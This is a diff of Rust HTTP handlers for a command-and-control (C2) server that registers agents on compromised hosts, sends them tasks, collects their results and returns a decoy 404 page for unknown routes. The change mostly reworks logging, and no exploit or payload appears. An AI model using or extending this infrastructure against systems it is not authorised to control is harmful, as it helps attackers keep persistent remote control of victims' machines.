@@ -12,7 +12,8 @@ use crate::utils::logging::{Logging, LogEntry};
 
 pub async fn handle_beacon(msg: web::Json<AgentMessage>, c2: web::Data<Arc<Mutex<C2>>>, log_tx: web::Data<Sender<LogEntry>>) -> impl Responder {
     // println!("Received: {:?}", msg);
-    log_tx.send((Logging::INFO, format!("Received beacon: {:?}", msg))).await.ok();
+    //log_tx.send((Logging::INFO, format!("Received beacon: {:?}", msg))).await.ok();
+    Logging::INFO.log_global(&format!("Received beacon: {:?}", msg));
 
     match &*msg {
         AgentMessage::Beacon { 
@@ -22,7 +23,8 @@ pub async fn handle_beacon(msg: web::Json<AgentMessage>, c2: web::Data<Arc<Mutex
             let mut c2 = c2.lock().await;
             let session = Uuid::new_v4().to_string();
             let agent_id = c2.create_agent(&ip, &hostname, &os, &time_compromised, &session).await;
-            log_tx.send((Logging::INFO, format!("Agent {} connected from: {}", agent_id, &ip))).await.ok();
+            log_tx.send((Logging::SUCCESS, format!("Agent {} connected from: {}", agent_id, &ip))).await.ok();
+            Logging::SUCCESS.log_global(&format!("Agent {} connected from: {}", agent_id, &ip));
 
 
             // Handle key storage
@@ -35,8 +37,9 @@ pub async fn handle_beacon(msg: web::Json<AgentMessage>, c2: web::Data<Arc<Mutex
                 status: "Registered".to_string(),
             };
 
+            Logging::INFO.log_global(&format!("Sent beacon acknowledgment: {:?}", ack));
+
             return HttpResponse::Ok().json(ack);
-            //return HttpResponse::Ok().body("deserializing working");
         }
         _ => { return HttpResponse::BadRequest().body("Invalid message type"); }
     }
@@ -45,7 +48,8 @@ pub async fn handle_beacon(msg: web::Json<AgentMessage>, c2: web::Data<Arc<Mutex
 
 pub async fn handle_heartbeat(msg: web::Json<AgentMessage>, c2: web::Data<Arc<Mutex<C2>>>, log_tx: web::Data<Sender<LogEntry>>) -> impl Responder {
     // println!("Received: {:?}", msg);
-    log_tx.send((Logging::INFO, format!("Received beacon: {:?}", msg))).await.ok();
+    //log_tx.send((Logging::INFO, format!("Received beacon: {:?}", msg))).await.ok();
+    Logging::INFO.log_global(&format!("Received heartbeat: {:?}", msg));
 
     match &*msg {
         AgentMessage::Heartbeat { 
@@ -63,7 +67,7 @@ pub async fn handle_heartbeat(msg: web::Json<AgentMessage>, c2: web::Data<Arc<Mu
                         c2.update_result(*agent_id, res.clone()).await;
                     }
                     log_tx.send((Logging::INFO, format!("[+] Received data from Agent {}: {:?}", agent_id, res))).await.ok();
-                    // Logging::SUCCESS.print_message(&format!("[+] Received data from Agent {}", agent_id));
+                    Logging::SUCCESS.log_global(&format!("[+] Received data from Agent {}", agent_id));
                 }
 
                 let tasks_opt = {
@@ -84,6 +88,7 @@ pub async fn handle_heartbeat(msg: web::Json<AgentMessage>, c2: web::Data<Arc<Mu
                         //     &format!("[+] Received Heartbeat from Agent {} and sent {} tasks", agent_id, num)
                         // );
                         log_tx.send((Logging::INFO, format!("[+] Received Heartbeat from Agent {} and sent {} tasks", agent_id, num))).await.ok();
+                        Logging::INFO.log_global(&format!("[+] Received Heartbeat from Agent {} and sent {} tasks", agent_id, num));
 
                         return HttpResponse::Ok().json(task);
                     }
@@ -92,6 +97,7 @@ pub async fn handle_heartbeat(msg: web::Json<AgentMessage>, c2: web::Data<Arc<Mu
                         //     &format!("[+] Received Heartbeat from Agent {}", agent_id)
                         // );
                         log_tx.send((Logging::INFO, format!("[+] Received Heartbeat from Agent {}", agent_id))).await.ok();
+                        Logging::INFO.log_global(&format!("[+] Received Heartbeat from Agent {}", agent_id));
 
                         return HttpResponse::NoContent().finish()
                     }
@@ -106,7 +112,7 @@ pub async fn handle_heartbeat(msg: web::Json<AgentMessage>, c2: web::Data<Arc<Mu
 }
 
 pub async fn handle_disconnect(msg: web::Json<AgentMessage>, c2: web::Data<Arc<Mutex<C2>>>, log_tx: web::Data<Sender<LogEntry>>) -> impl Responder {
-    log_tx.send((Logging::INFO, format!("Received disconnect: {:?}", msg))).await.ok();
+    Logging::INFO.log_global(&format!("Received disconnect: {:?}", msg));
 
     match &*msg {
         AgentMessage::Disconnect {
@@ -118,6 +124,8 @@ pub async fn handle_disconnect(msg: web::Json<AgentMessage>, c2: web::Data<Arc<M
                 c2.remove_agent(*agent_id).await;
             }
 
+            log_tx.send((Logging::INFO, format!("Agent {} disconnected", agent_id))).await.ok();
+
             HttpResponse::Ok().body("Removed agent")
         }
         _ => HttpResponse::BadRequest().body("Invalid message type")
@@ -125,7 +133,8 @@ pub async fn handle_disconnect(msg: web::Json<AgentMessage>, c2: web::Data<Arc<M
 }
 
 pub async fn handle_reconnect(msg: web::Json<AgentMessage>, c2: web::Data<Arc<Mutex<C2>>>, log_tx: web::Data<Sender<LogEntry>>) -> impl Responder {
-    log_tx.send((Logging::INFO, format!("Received reconnect: {:?}", msg))).await.ok();
+    // log_tx.send((Logging::INFO, format!("Received reconnect: {:?}", msg))).await.ok();
+    Logging::INFO.log_global(&format!("Received reconnect: {:?}", msg));
 
     match &*msg {
         AgentMessage::Reconnect {
@@ -150,6 +159,9 @@ pub async fn handle_reconnect(msg: web::Json<AgentMessage>, c2: web::Data<Arc<Mu
                     status: "Reconnected".to_string(),
                 };
 
+                log_tx.send((Logging::INFO, format!("Agent {} reconnected", agent_id_copy))).await.ok();
+                Logging::INFO.log_global(&format!("Sent reconnect acknowledgment: {:?}", ack));
+
                 return HttpResponse::Ok().json(ack);
             }
 
@@ -161,15 +173,13 @@ pub async fn handle_reconnect(msg: web::Json<AgentMessage>, c2: web::Data<Arc<Mu
 }
 
 pub async fn handle_catch_all(req: HttpRequest, log_tx: web::Data<Sender<LogEntry>>) -> HttpResponse {
-    // Silent log for unmatched paths
-    // println!("🔍 Unknown route accessed: {}", req.path());
-
     let connection_info = req.connection_info();
     let ip = connection_info.realip_remote_addr().unwrap_or("unknown");
     let user_agent = req.headers().get("User-Agent").and_then(|ua| ua.to_str().ok()).unwrap_or("unknown");
 
     // println!("🔍 Unknown route: {} from {} [{}]", req.path(), ip, user_agent);
     log_tx.send((Logging::DEBUG, format!("Unknown route accessed: {} from {} [{}]", req.path(), ip, user_agent))).await.ok();
+    Logging::DEBUG.log_global(&format!("Unknown route accessed: {} from {} [{}]", req.path(), ip, user_agent));
 
     HttpResponse::NotFound()
         .content_type("text/html")
@@ -178,5 +188,6 @@ pub async fn handle_catch_all(req: HttpRequest, log_tx: web::Data<Sender<LogEntr
 
 // GET route: health check
 pub async fn health_check() -> impl Responder {
+    Logging::INFO.log_global("C2 Server is running");
     HttpResponse::Ok().body("C2 Server is running")
 }
